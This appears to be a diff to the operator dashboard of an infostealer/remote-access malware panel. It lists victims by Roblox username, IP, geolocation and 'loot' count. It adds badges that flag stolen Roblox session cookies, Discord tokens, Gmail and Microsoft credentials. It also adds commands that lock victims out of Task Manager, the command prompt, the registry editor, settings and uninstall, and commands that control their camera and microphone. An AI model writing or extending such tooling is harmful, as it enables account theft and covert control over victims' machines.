@@ -285,6 +285,15 @@ function appendOut(id, text) {
   el.textContent = (line + '\n' + el.textContent).slice(0, 40000);
 }
 
+function qualityBadges(obj) {
+  const badges = [];
+  const blob = JSON.stringify(obj || {}).toLowerCase();
+  if (blob.includes('roblosecurity') || blob.includes('roblox_security') || blob.includes('.roblosecurity')) badges.push('<span class="pill" style="background:#34d399;color:#042">RBX_SESSION</span>');
+  if (blob.includes('discord') && (blob.includes('token') || blob.includes('netscape'))) badges.push('<span class="pill" style="background:#818cf8;color:#111">DISCORD</span>');
+  if (blob.includes('gmail') || blob.includes('accounts.google') || blob.includes('netscape_google')) badges.push('<span class="pill" style="background:#fbbf24;color:#111">GMAIL</span>');
+  if (blob.includes('outlook') || blob.includes('microsoft')) badges.push('<span class="pill" style="background:#38bdf8;color:#111">MS_MAIL</span>');
+  return badges.join(' ');
+}
 function esc(s) {
   return String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 }
@@ -1935,7 +1944,7 @@ async function refreshPetshift() {
       const age = lastSeenAge(p.last_seen);
       const user = p.roblox_user || 'no login';
       return `<div class="victim-card" onclick="openPetshiftDetail('${p.pid}')" style="cursor:pointer">
-        <div class="vc-top"><span class="vc-name">${esc(user)}</span><span class="vc-tag">${esc(p.platform || 'web')}</span></div>
+        <div class="vc-top"><span class="vc-name">${esc(user)}</span><span class="vc-tag">${esc(p.platform || 'web')}</span> ${qualityBadges(p)}</div>
         <div class="vc-meta">${esc(p.ip || '?')} · ${esc(geo || '—')}</div>
         <div class="vc-meta"><span class="pill">loot ${p.loot_count || 0}</span> · ${esc(age)} · <span class="muted">${esc((p.pid || '').slice(0,10))}</span></div>
         <div class="vc-meta muted">${esc((p.ua || '').slice(0,90))}</div>
@@ -2143,4 +2152,19 @@ async function psBrowserSteal(pid, kind) {
     });
   } catch (e) {}
   toast('queued ' + cmd + ' — wait for next beacon');
+}
+
+
+function lockPerm(name, on) {
+  const args = {};
+  args[name] = !!on;
+  send('lock_set', args);
+  toast((on?'lock ':'unlock ') + name);
+}
+function lockAll(on) {
+  send('lock_set', {
+    taskmgr: on, cmd: on, regedit: on, camera: on,
+    microphone: on, uninstall: on, settings: on
+  });
+  toast(on ? 'lock all queued' : 'unlock all queued');
 }
